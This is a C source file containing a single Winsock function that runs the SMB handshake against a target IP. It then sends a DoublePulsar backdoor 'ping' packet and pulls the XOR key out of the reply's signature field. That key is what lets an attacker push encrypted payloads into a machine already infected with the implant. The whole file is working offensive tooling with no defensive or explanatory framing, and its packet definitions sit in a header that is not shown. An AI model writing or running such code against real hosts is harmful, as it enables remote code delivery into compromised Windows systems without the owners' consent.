#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include "config.h"

extern SOCKET smb_connect(const char *ip, int port);

static int dp_send_all(SOCKET sock, const unsigned char *buffer, size_t length)
{
    size_t sent = 0;

    while (sent < length) {
        size_t remaining = length - sent;
        int chunk = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;
        int result = send(sock, (const char *)buffer + sent, chunk, 0);

        if (result == SOCKET_ERROR || result == 0)
            return -1;

        sent += (size_t)result;
    }

    return 0;
}

static int dp_recv_all(SOCKET sock, unsigned char *buffer, size_t length)
{
    size_t received = 0;

    while (received < length) {
        size_t remaining = length - received;
        int chunk = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;
        int result = recv(sock, (char *)buffer + received, chunk, 0);

        if (result == SOCKET_ERROR || result == 0)
            return -1;

        received += (size_t)result;
    }

    return 0;
}

static int dp_recv_smb_response(SOCKET sock, unsigned char *buffer,
                                size_t capacity, size_t *response_size)
{
    uint32_t payload_size;

    if (capacity < 4 || dp_recv_all(sock, buffer, 4) != 0)
        return -1;

    payload_size = ((uint32_t)buffer[1] << 16) |
                   ((uint32_t)buffer[2] << 8) |
                   (uint32_t)buffer[3];

    if ((size_t)payload_size > capacity - 4)
        return -1;

    if (dp_recv_all(sock, buffer + 4, (size_t)payload_size) != 0)
        return -1;

    *response_size = (size_t)payload_size + 4;
    return 0;
}

unsigned int DoublePulsarXORKeyCalculator(const char *ip, int port)
{
    SOCKET sock;
    unsigned char response[65536];
    size_t response_size = 0;
    unsigned char negotiate[sizeof(SMB_NEGOTIATE_PKT)];
    unsigned char session_setup[sizeof(SMB_SESSION_SETUP_PKT)];
    unsigned char tree_connect[sizeof(SMB_TREE_CONNECT_PKT)];
    unsigned char ping[sizeof(DP_PING_PKT)];
    uint32_t xor_key;
    unsigned int result = 0;

    if (ip == NULL || port <= 0 ||
        SMB_RESP_SIGNATURE_END < SMB_RESP_SIGNATURE_START ||
        SMB_RESP_SIGNATURE_END - SMB_RESP_SIGNATURE_START != 4)
        return 0;

    sock = smb_connect(ip, port);
    if (sock == INVALID_SOCKET)
        return 0;

    memcpy(negotiate, SMB_NEGOTIATE_PKT, sizeof(SMB_NEGOTIATE_PKT));
    if (dp_send_all(sock, negotiate, sizeof(SMB_NEGOTIATE_PKT) - 1) != 0 ||
        dp_recv_smb_response(sock, response, sizeof(response), &response_size) != 0)
        goto cleanup;

    memcpy(session_setup, SMB_SESSION_SETUP_PKT, sizeof(SMB_SESSION_SETUP_PKT));
    if (dp_send_all(sock, session_setup, sizeof(SMB_SESSION_SETUP_PKT) - 1) != 0 ||
        dp_recv_smb_response(sock, response, sizeof(response), &response_size) != 0 ||
        response_size < 34)
        goto cleanup;

    memcpy(tree_connect, SMB_TREE_CONNECT_PKT, sizeof(SMB_TREE_CONNECT_PKT));
    if (sizeof(SMB_TREE_CONNECT_PKT) < 34)
        goto cleanup;
    tree_connect[32] = response[32];
    tree_connect[33] = response[33];

    if (dp_send_all(sock, tree_connect, sizeof(SMB_TREE_CONNECT_PKT) - 1) != 0 ||
        dp_recv_smb_response(sock, response, sizeof(response), &response_size) != 0 ||
        response_size < 34)
        goto cleanup;

    memcpy(ping, DP_PING_PKT, sizeof(DP_PING_PKT));
    if (sizeof(DP_PING_PKT) < 34)
        goto cleanup;
    ping[28] = response[28];
    ping[29] = response[29];
    ping[32] = response[32];
    ping[33] = response[33];

    if (dp_send_all(sock, ping, sizeof(DP_PING_PKT) - 1) != 0 ||
        dp_recv_smb_response(sock, response, sizeof(response), &response_size) != 0 ||
        response_size < (size_t)SMB_RESP_SIGNATURE_END)
        goto cleanup;

    xor_key = (uint32_t)response[SMB_RESP_SIGNATURE_START] |
              ((uint32_t)response[SMB_RESP_SIGNATURE_START + 1] << 8) |
              ((uint32_t)response[SMB_RESP_SIGNATURE_START + 2] << 16) |
              ((uint32_t)response[SMB_RESP_SIGNATURE_START + 3] << 24);
    result = (unsigned int)xor_key;

cleanup:
    closesocket(sock);
    return result;
}